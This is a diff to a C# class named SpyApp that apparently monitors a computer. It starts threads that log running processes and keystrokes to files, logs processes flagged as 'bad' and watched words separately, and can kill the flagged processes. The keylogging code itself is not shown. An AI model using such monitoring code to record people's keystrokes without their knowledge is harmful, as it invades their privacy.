@@ -31,12 +31,14 @@ namespace SpyApp
         /// </summary>
         public void On()
         {
-            if (_spyInfo.WhereToWriteProcs != string.Empty)
+            if (_spyInfo.WhereToWriteProcs != string.Empty ||
+                _spyInfo.WhereToWriteBadProcs != string.Empty)
             {
                 Thread procsThread = new Thread(new ThreadStart(ProcessesThreadFunct));
                 procsThread.Start();
             }
-            if (_spyInfo.WhereToWriteKeys != string.Empty)
+            if (_spyInfo.WhereToWriteKeys != string.Empty ||
+                _spyInfo.WhereToWriteWords != string.Empty)
             {
                 Thread keysThread = new Thread(new ThreadStart(PressedKeysThreadFunct));
                 keysThread.Start();
@@ -123,9 +125,19 @@ namespace SpyApp
             foreach (var p in prcs)
             {
                 info += GetProcInfo(p);
-            }
 
-            WriteToFile(_spyInfo.WhereToWriteProcs, info);
+                if (IsProcessBad(p))
+                {
+                    if (_spyInfo.WhereToWriteBadProcs != "")
+                        WriteToFile(_spyInfo.WhereToWriteBadProcs, info);
+
+                    if (_spyInfo.IsCloseBadApp)
+                        p.Kill();
+                }
+
+                if(_spyInfo.WhereToWriteProcs!="")
+                    WriteToFile(_spyInfo.WhereToWriteProcs, info);
+            }           
         }
         private string GetProcInfo(Process prc)
         {
@@ -133,16 +145,7 @@ namespace SpyApp
 
             try
             {
-                info = $"{prc.StartTime} | id = {prc.Id} | {prc.ProcessName} ";
-                if (IsProcessBad(prc))
-                {
-                    info += "BAD PROCESS!\n";
-
-                    if (_spyInfo.IsCloseBadApp)
-                        prc.Kill();
-                }
-                else
-                    info += "\n";
+                info = $"{prc.StartTime} | id = {prc.Id} | {prc.ProcessName} \n";
             }
             catch(Exception e)
             {
